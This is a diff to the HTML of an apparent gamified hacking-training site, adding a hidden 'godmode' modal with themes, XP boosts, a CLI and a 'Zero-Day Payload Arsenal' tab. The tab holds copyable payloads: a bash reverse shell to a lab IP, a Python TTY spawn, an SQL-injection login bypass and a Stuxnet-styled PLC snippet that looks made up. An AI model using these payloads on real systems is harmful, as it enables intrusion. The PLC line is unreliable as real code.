@@ -1056,35 +1056,106 @@
     <!-- (Unlocked via Breach Minigame Overclock Cipher)           -->
     <!-- ======================================================== -->
     <div class="secret-vault-modal" id="architectGodModeModal" style="display: none;">
-        <div class="secret-vault-card" style="max-width: 820px;">
-            <div class="secret-vault-header" style="border-bottom-color: #ffe600;">
-                <div style="display: flex; align-items: center; gap: 8px;">
-                    <span style="color: #ffe600; font-size: 1.2rem;">⚡</span>
+        <!-- Fullscreen Three.js WebGL 3D Celebration Canvas -->
+        <canvas id="threeGodmodeCelebrationCanvas" class="godmode-3d-canvas"></canvas>
+
+        <div class="secret-vault-card">
+            <div class="secret-vault-header" style="border-bottom-color: #ffe600; padding: 14px 24px; background: rgba(0, 0, 0, 0.65);">
+                <div style="display: flex; align-items: center; gap: 12px; flex-wrap: wrap;">
+                    <span style="color: #ffe600; font-size: 1.4rem; filter: drop-shadow(0 0 8px #ffe600);">👑</span>
                     <div>
-                        <div
-                            style="font-family: 'Space Mono', monospace; font-size: 0.95rem; font-weight: 800; color: #ffe600;">
-                            OVERCLOCK CIPHER DETECTED // ARCHITECT GODMODE</div>
-                        <div style="font-family: 'Space Mono', monospace; font-size: 0.65rem; color: #94a3b8;">ROOT
-                            CLEARANCE VERIFIED // PRANAV PUSHYA ARCHITECTURE</div>
+                        <div style="font-family: 'Space Mono', monospace; font-size: 1rem; font-weight: 800; color: #ffe600; letter-spacing: 1px;">
+                            CLASSIFIED ARCHITECT GODMODE // SYSTEM CREATOR: PRANAV PUSHYA
+                        </div>
+                        <div style="display: flex; align-items: center; gap: 10px; font-family: 'Space Mono', monospace; font-size: 0.7rem; color: #94a3b8; margin-top: 2px; flex-wrap: wrap;">
+                            <span id="godmodeCustomMsg" style="color: #ffe600; font-weight: 700;">KONAMI CODE DETECTED: GODMODE ACTIVE</span>
+                            <span style="color: #10b981;">● ROOT CLEARANCE: OMEGA-0 UNRESTRICTED</span>
+                            <span style="color: #38bdf8;">● ALL 7 KILL-CHAINS OVERRIDDEN</span>
+                            <span style="color: #f59e0b;">● 3D WEBGL ENGINE ACTIVE</span>
+                        </div>
                     </div>
                 </div>
-                <button class="secret-vault-close" onclick="closeGodModeModal()">&times;</button>
+                <div style="display: flex; align-items: center; gap: 10px;">
+                    <button class="btn-godmode-action" onclick="trigger3DCelebrationFireworks()" title="Fire celebratory 3D WebGL particle fireworks across the screen" style="background: rgba(255, 230, 0, 0.15); border: 1px solid #ffe600; color: #ffe600; font-family: 'Space Mono', monospace; font-size: 0.72rem; font-weight: 800; padding: 6px 14px; cursor: pointer; display: flex; align-items: center; gap: 6px;">
+                        <span>🎆</span> <span>REPLAY 3D CELEBRATION</span>
+                    </button>
+                    <button class="secret-vault-close" onclick="closeGodModeModal()" style="font-size: 1.8rem; line-height: 1; padding: 4px 10px; color: #94a3b8; cursor: pointer;" title="Close Godmode Deck">&times;</button>
+                </div>
             </div>
 
             <div class="vault-tabs">
-                <button class="vault-tab-btn active" id="tabBtnGodmode" onclick="switchGodModeTab('godmode')">👑 GODMODE
-                    & VIP THEMES</button>
-                <button class="vault-tab-btn" id="tabBtnArcade" onclick="switchGodModeTab('arcade')">🎮 RETRO "WARGAMES"
-                    ARCADE</button>
+                <button class="vault-tab-btn active" id="tabBtnGodmode" onclick="switchGodModeTab('godmode')">👑 SPECIAL ACCESS & GODMODE</button>
+                <button class="vault-tab-btn" id="tabBtnArcade" onclick="switchGodModeTab('arcade')">🎮 RETRO "WARGAMES" ARCADE</button>
+                <button class="vault-tab-btn" id="tabBtnArsenal" onclick="switchGodModeTab('arsenal')">💣 ZERO-DAY PAYLOAD ARSENAL</button>
+                <button class="vault-tab-btn" id="tabBtnTerminal" onclick="switchGodModeTab('terminal')">💻 ARCHITECT CLI EXECUTOR</button>
             </div>
 
-            <!-- SUB-TAB 1: GODMODE THEMES & AUDIO -->
-            <div id="godmodeTab" class="vault-tab-content" style="display: flex; flex-direction: column; gap: 16px;">
+            <!-- SUB-TAB 1: SPECIAL ACCESS & GODMODE POWERS -->
+            <div id="godmodeTab" class="vault-tab-content" style="display: flex; flex-direction: column; gap: 16px; overflow-y: auto;">
+                <div class="godmode-unlock-banner">
+                    <div style="font-family: 'Space Mono', monospace; font-size: 0.95rem; font-weight: 800; color: #10b981; display: flex; align-items: center; gap: 8px;">
+                        <span>⚡</span> <span>VIP ARCHITECT ROOT OVERRIDE ACTIVATED // ALL MODULES UNLOCKED</span>
+                    </div>
+                    <p style="font-size: 0.78rem; color: #cbd5e1; margin: 6px 0 0 0; line-height: 1.5;">
+                        Welcome, Architect Pranav Pushya. All restrictive firewalls, lab locks, and module prerequisites have been disarmed across PwnBox. Your operative rank is elevated to <b>ROOT ARCHITECT</b> with Omega-0 Unrestricted Clearance.
+                    </p>
+                </div>
+
+                <div class="godmode-features-grid">
+                    <!-- Feature 1: Academy Zero-Day Bypass -->
+                    <div class="godmode-feature-card gold-highlight">
+                        <div style="font-family: 'Space Mono', monospace; font-size: 0.82rem; font-weight: 800; color: #ffe600; display: flex; align-items: center; gap: 6px;">
+                            <span>🔓</span> <span>ACADEMY ZERO-DAY BYPASS</span>
+                        </div>
+                        <p style="font-size: 0.72rem; color: #94a3b8; line-height: 1.4;">
+                            Direct root access to all 8 core academy training tracks. Module 08 (BlackOps) has been force-unlocked.
+                        </p>
+                        <div style="display: flex; gap: 8px; flex-wrap: wrap; margin-top: auto;">
+                            <a href="dashboard.html" class="btn-action-gold" style="flex: 1;">ENTER DASHBOARD 🚀</a>
+                            <a href="modules/BlackOps.html" class="btn-action-gold" style="background: #9333ea; color: #fff; flex: 1;">LAUNCH M08: BLACK OPS ⚡</a>
+                        </div>
+                    </div>
+
+                    <!-- Feature 2: Overclock XP (+10,000 XP) -->
+                    <div class="godmode-feature-card">
+                        <div style="font-family: 'Space Mono', monospace; font-size: 0.82rem; font-weight: 800; color: #38bdf8; display: flex; align-items: center; gap: 6px;">
+                            <span>⭐</span> <span>OVERCLOCK OPERATIVE XP</span>
+                        </div>
+                        <p style="font-size: 0.72rem; color: #94a3b8; line-height: 1.4;">
+                            Current Operative XP: <b id="godmodeXpDisplay" style="color: #10b981;">10,000+ XP</b>. Click below to inject +10,000 XP directly to your profile.
+                        </p>
+                        <button class="btn-action-gold" onclick="boostGodmodeXP()" style="margin-top: auto;">⚡ BOOST +10,000 XP</button>
+                    </div>
+
+                    <!-- Feature 3: Rainbow Holographic ID Stamp -->
+                    <div class="godmode-feature-card">
+                        <div style="font-family: 'Space Mono', monospace; font-size: 0.82rem; font-weight: 800; color: #f1f5f9; display: flex; align-items: center; gap: 6px;">
+                            <span>🌈</span> <span>RAINBOW HOLOGRAPHIC ID STAMP</span>
+                        </div>
+                        <p style="font-size: 0.72rem; color: #94a3b8; line-height: 1.4;">
+                            Stamps an animated prismatic holographic ROOT ARCHITECT credential badge on your Dossier ID card and enables the persistent corner HUD.
+                        </p>
+                        <button class="btn-action-gold" onclick="toggleRainbowGodmodeBadge()" id="btnRainbowBadgeToggle" style="background: rgba(0, 240, 255, 0.15); border: 1px solid #00f0ff; color: #00f0ff; margin-top: auto;">ACTIVATE HOLOGRAPHIC BADGE</button>
+                    </div>
+
+                    <!-- Feature 4: Cyber Synth Ambient Audio Deck -->
+                    <div class="godmode-feature-card">
+                        <div style="font-family: 'Space Mono', monospace; font-size: 0.82rem; font-weight: 800; color: #f1f5f9; display: flex; align-items: center; gap: 6px;">
+                            <span>🎵</span> <span>CYBER SYNTH AMBIENT DECK</span>
+                        </div>
+                        <p style="font-size: 0.72rem; color: #94a3b8; line-height: 1.4;">
+                            Procedural generative retro cyberpunk drone synthesizer using the Web Audio API (55Hz / 110Hz).
+                        </p>
+                        <button class="btn-action-gold" onclick="toggleAmbientAudio()" id="btnAmbientAudioToggle" style="background: rgba(217, 70, 239, 0.15); border: 1px solid #d946ef; color: #d946ef; margin-top: auto;">▶ PLAY SYNTH DRONE</button>
+                    </div>
+                </div>
+
+                <!-- UNLISTED SECRET VIP THEMES -->
                 <div>
-                    <h4
-                        style="font-family: 'Space Mono', monospace; font-size: 0.82rem; color: #f1f5f9; margin-bottom: 8px;">
-                        UNLISTED SECRET VIP THEMES:</h4>
-                    <div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px;">
+                    <h4 style="font-family: 'Space Mono', monospace; font-size: 0.82rem; color: #f1f5f9; margin-bottom: 8px;">
+                        UNLISTED SECRET VIP THEMES:
+                    </h4>
+                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 10px;">
                         <button class="btn-secret-theme" onclick="applySecretTheme('matrix')">
                             <span style="font-size: 1.2rem;">🟢</span>
                             <b>1999 MATRIX</b>
@@ -1100,38 +1171,17 @@
                             <b>SYNTHWAVE '84</b>
                             <span style="font-size: 0.65rem; color: #94a3b8;">Neon Sunset Vaporwave</span>
                         </button>
-                    </div>
-                </div>
-
-                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px;">
-                    <!-- Rainbow Badge Trigger -->
-                    <div
-                        style="background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.15); padding: 14px; display: flex; flex-direction: column; gap: 8px;">
-                        <div
-                            style="font-family: 'Space Mono', monospace; font-size: 0.78rem; font-weight: 800; color: #f1f5f9;">
-                            🌈 RAINBOW HOLOGRAPHIC ID STAMP</div>
-                        <p style="font-size: 0.72rem; color: #94a3b8;">Stamps an animated prismatic holographic ROOT
-                            ARCHITECT credential badge on your Dossier ID card.</p>
-                        <button class="btn-action-cyan" onclick="toggleRainbowGodmodeBadge()"
-                            id="btnRainbowBadgeToggle">ACTIVATE HOLOGRAPHIC BADGE</button>
-                    </div>
-
-                    <!-- Ambient Cyber Audio -->
-                    <div
-                        style="background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.15); padding: 14px; display: flex; flex-direction: column; gap: 8px;">
-                        <div
-                            style="font-family: 'Space Mono', monospace; font-size: 0.78rem; font-weight: 800; color: #f1f5f9;">
-                            🎵 CYBER SYNTH AMBIENT DECK</div>
-                        <p style="font-size: 0.72rem; color: #94a3b8;">Procedural generative retro cyberpunk drone
-                            synthesizer using the Web Audio API.</p>
-                        <button class="btn-action-cyan" onclick="toggleAmbientAudio()" id="btnAmbientAudioToggle">▶ PLAY
-                            SYNTH DRONE</button>
+                        <button class="btn-secret-theme" onclick="applySecretTheme('dark')">
+                            <span style="font-size: 1.2rem;">⚡</span>
+                            <b>QUANTUM CYAN</b>
+                            <span style="font-size: 0.65rem; color: #94a3b8;">Tactical Stealth Blue</span>
+                        </button>
                     </div>
                 </div>
             </div>
 
             <!-- SUB-TAB 2: RETRO WARGAMES TEXT ARCADE -->
-            <div id="arcadeTab" class="vault-tab-content" style="display: none;">
+            <div id="arcadeTab" class="vault-tab-content" style="display: none; overflow-y: auto;">
                 <div class="wargames-terminal">
                     <div class="wargames-header">
                         <span>NORAD W.O.P.R. MAINFRAME // DEFENSE SIMULATION</span>
@@ -1147,10 +1197,8 @@
                             | | | | || || | || | || . \
                             |__| |__|__||_____||___|___||__|__||__|\_|
                         </div>
-                        <div style="color: #f59e0b; margin-top: 8px;">[W.O.P.R.] GREETINGS PROFESSOR FALKEN. SHALL WE
-                            PLAY A GAME?</div>
-                        <div style="color: #94a3b8; font-size: 0.75rem;">Type 'help' to view available tactical
-                            commands. (probe, bypass, inject).</div>
+                        <div style="color: #f59e0b; margin-top: 8px;">[W.O.P.R.] GREETINGS PROFESSOR FALKEN. SHALL WE PLAY A GAME?</div>
+                        <div style="color: #94a3b8; font-size: 0.75rem;">Type 'help' to view available tactical commands. (probe, bypass, inject).</div>
                     </div>
                     <!-- Quick Command Shortcuts Bar -->
                     <div class="darknet-quick-actions-bar" style="border-top: 1px solid rgba(245, 158, 11, 0.25); border-bottom: 1px solid rgba(245, 158, 11, 0.25); background: rgba(0, 0, 0, 0.45);">
@@ -1162,12 +1210,66 @@
                         <button class="darknet-quick-pill" style="border-color: #f59e0b; color: #f59e0b;" onclick="runWargamesShortcut('clear')">🧹 CLEAR</button>
                     </div>
                     <div class="darknet-cli-input-bar" style="border-top-color: #f59e0b;">
-                        <span
-                            style="color: #f59e0b; font-family: 'Space Mono', monospace; font-size: 0.8rem; font-weight: 700;">falken@wopr:~#</span>
-                        <input type="text" id="wargamesInput" class="darknet-cli-input" style="color: #f59e0b;"
-                            placeholder="enter tactical command (probe, bypass, inject)..." onkeypress="handleWargamesKey(event)">
-                        <button onclick="executeWargamesCmd(document.getElementById('wargamesInput').value); document.getElementById('wargamesInput').value='';"
-                            style="background: #f59e0b; color: #000; border: none; font-family: 'Space Mono', monospace; font-size: 0.72rem; font-weight: 800; padding: 4px 10px; cursor: pointer;">EXECUTE</button>
+                        <span style="color: #f59e0b; font-family: 'Space Mono', monospace; font-size: 0.8rem; font-weight: 700;">falken@wopr:~#</span>
+                        <input type="text" id="wargamesInput" class="darknet-cli-input" style="color: #f59e0b;" placeholder="enter tactical command (probe, bypass, inject)..." onkeypress="handleWargamesKey(event)">
+                        <button onclick="executeWargamesCmd(document.getElementById('wargamesInput').value); document.getElementById('wargamesInput').value='';" style="background: #f59e0b; color: #000; border: none; font-family: 'Space Mono', monospace; font-size: 0.72rem; font-weight: 800; padding: 4px 10px; cursor: pointer;">EXECUTE</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- SUB-TAB 3: ZERO-DAY PAYLOAD ARSENAL -->
+            <div id="arsenalTab" class="vault-tab-content" style="display: none; flex-direction: column; gap: 12px; overflow-y: auto;">
+                <div style="font-family: 'Space Mono', monospace; font-size: 0.8rem; color: #38bdf8; margin-bottom: 4px;">
+                    CLASSIFIED ROOT EXPLOIT ARSENAL // ONE-CLICK DEPLOYABLE PAYLOADS:
+                </div>
+                <div class="arsenal-item">
+                    <div class="arsenal-header">
+                        <span>1. LINUX BASH REVERSE TCP SHELL</span>
+                        <button class="darknet-quick-pill" onclick="copyArsenalPayload('bash -i >& /dev/tcp/10.10.14.4/4444 0>&1', this)">📋 COPY</button>
+                    </div>
+                    <div class="arsenal-code-box">bash -i &gt;&amp; /dev/tcp/10.10.14.4/4444 0&gt;&amp;1</div>
+                </div>
+
+                <div class="arsenal-item">
+                    <div class="arsenal-header">
+                        <span>2. PYTHON3 INTERACTIVE TTY SPAWN</span>
+                        <button class="darknet-quick-pill" onclick="copyArsenalPayload('python3 -c \'import pty; pty.spawn(\&quot;/bin/bash\&quot;)\'', this)">📋 COPY</button>
+                    </div>
+                    <div class="arsenal-code-box">python3 -c 'import pty; pty.spawn("/bin/bash")'</div>
+                </div>
+
+                <div class="arsenal-item">
+                    <div class="arsenal-header">
+                        <span>3. STUXNET PLC ROTOR OVERCLOCK INJECTION (STEP-7)</span>
+                        <button class="darknet-quick-pill" onclick="copyArsenalPayload('L DB89.DBD 0; L 1410; >=D; JC M_CORRUPT_ROTOR; BEU', this)">📋 COPY</button>
+                    </div>
+                    <div class="arsenal-code-box">L DB89.DBD 0; L 1410; &gt;=D; JC M_CORRUPT_ROTOR; BEU</div>
+                </div>
+
+                <div class="arsenal-item">
+                    <div class="arsenal-header">
+                        <span>4. UNIVERSAL SQLi AUTHENTICATION BYPASS</span>
+                        <button class="darknet-quick-pill" onclick="copyArsenalPayload('admin\' OR \'1\'=\'1\' -- -', this)">📋 COPY</button>
+                    </div>
+                    <div class="arsenal-code-box">admin' OR '1'='1' -- -</div>
+                </div>
+            </div>
+
+            <!-- SUB-TAB 4: ARCHITECT CLI EXECUTOR -->
+            <div id="terminalTab" class="vault-tab-content" style="display: none; flex-direction: column; gap: 10px; overflow-y: auto;">
+                <div class="wargames-terminal" style="border-color: #00f0ff;">
+                    <div class="wargames-header" style="background: rgba(0, 240, 255, 0.15); border-bottom-color: #00f0ff;">
+                        <span style="color: #00f0ff;">ARCHITECT DIRECT COMMAND INTERFACE // ROOT VIP CLI</span>
+                        <span style="color: #10b981;">CONNECTED: PRANAV_PUSHYA@PWNBOX</span>
+                    </div>
+                    <div class="wargames-body" id="godmodeCliOutput" style="min-height: 220px;">
+                        <div style="color: #00f0ff; font-family: monospace;">[ARCHITECT_CONSOLE] Ready for direct system directives.</div>
+                        <div style="color: #94a3b8; font-size: 0.75rem;">Available commands: <b>help</b>, <b>unlock-all</b>, <b>boost-xp</b>, <b>fireworks</b>, <b>matrix</b>, <b>synth</b>, <b>theme &lt;name&gt;</b>, <b>clear</b></div>
+                    </div>
+                    <div class="darknet-cli-input-bar" style="border-top-color: #00f0ff;">
+                        <span style="color: #00f0ff; font-family: 'Space Mono', monospace; font-size: 0.8rem; font-weight: 700;">architect@root:~#</span>
+                        <input type="text" id="godmodeCliInput" class="darknet-cli-input" style="color: #00f0ff;" placeholder="type command (e.g. unlock-all, boost-xp, fireworks)..." onkeypress="handleGodmodeExecutorKey(event)">
+                        <button onclick="executeGodmodeCmd(document.getElementById('godmodeCliInput').value); document.getElementById('godmodeCliInput').value='';" style="background: #00f0ff; color: #000; border: none; font-family: 'Space Mono', monospace; font-size: 0.72rem; font-weight: 800; padding: 4px 10px; cursor: pointer;">EXECUTE</button>
                     </div>
                 </div>
             </div>
